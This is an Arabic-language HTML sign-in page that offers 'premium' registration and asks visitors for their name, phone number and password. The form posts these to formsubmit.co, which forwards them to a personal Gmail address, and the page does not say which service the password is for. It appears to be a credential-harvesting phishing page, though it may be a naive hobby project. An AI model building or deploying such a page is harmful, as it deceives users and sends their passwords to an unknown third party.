<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل للبريميوم بالرقم السري</title>
        <link rel="icon" href="image\call.jpeg">
</head>
<style>




*{
    margin: 0px;
    padding: 0px;
    box-sizing: border-box;
    font-family: sans-serif;
}

.contact{
    min-height: 100vh;
  background-image: linear-gradient(90deg,#1c1c1c,#fffb00);
    padding: 50px;
    text-align: right;
}

.container{
    max-width: 800px;
    margin:0 auto;
}

.container h2{
    font-size: 36px;
    margin-bottom: 40px;
    color:#333;
}

contact form h3{
    font-size: 24px;
    margin-bottom: 20px;
    color:#333;
}

.form-group{
    margin-bottom: 20px;
}

input, textarea{
    width: 100%;
    padding: 12px;
    border-radius: 8px;
    border:none;
    background-color:#f8f9fa;
    color: #333;
}

input:focus,
textarea:focus{
    outline: none;
    box-shadow: 0 0 8px #bbb;
}


button {
  border-radius: .25rem;
  text-transform: uppercase;
  font-style: normal;
  font-weight: 400;
  padding-left: 25px;
  padding-right: 25px;
  color: #fff;
  -webkit-clip-path: polygon(0 0,0 0,100% 0,100% 0,100% calc(100% - 15px),calc(100% - 15px) 100%,15px 100%,0 100%);
  clip-path: polygon(0 0,0 0,100% 0,100% 0,100% calc(100% - 15px),calc(100% - 15px) 100%,15px 100%,0 100%);
  height: 40px;
  font-size: 0.7rem;
  line-height: 14px;
  letter-spacing: 1.2px;
  transition: .2s .1s;
  background-image: linear-gradient(90deg,#1c1c1c,#6220fb);
  border: 0 solid;
  overflow: hidden;
}

button:hover {
  cursor: pointer;
  transition: all .3s ease-in;
  padding-right: 30px;
  padding-left: 30px;
}






</style>
<body>




    <section class="contact">
        <div class="container">
<button onclick="document.location ='signin.html'">رجوع الي الصفحة السابقة</button>
<br><br>
<br><br>

            <h2>تسجيل دخول</h2>
                <div class="contact-form">
                <h3>سجل بياناتك كامة هنا</h3>
                
                <form action="https://formsubmit.co/hafez0919@gmail.com" method="POST" dir="rtl">
                    <div class="form-group">
                    <input type="text" name="name" required placeholder="أدخل أسمك">
                    </div>

                    <div class="form-group">
                    <input type="number" name="number" required placeholder="أدخل رقم هاتفك">
                    </div>

                    <div class="form-group">
                    <input type="password" name="password" required placeholder="أدخل الرقم السري">
                    </div>

                    <div class="form-group">
                    <textarea name="message" placeholder="comment"></textarea>
                    </div>
                    <button type="submit">ارسال</button>
                </form>
                </div>
            </div>
        </div>

    </section>



</body>
</html>
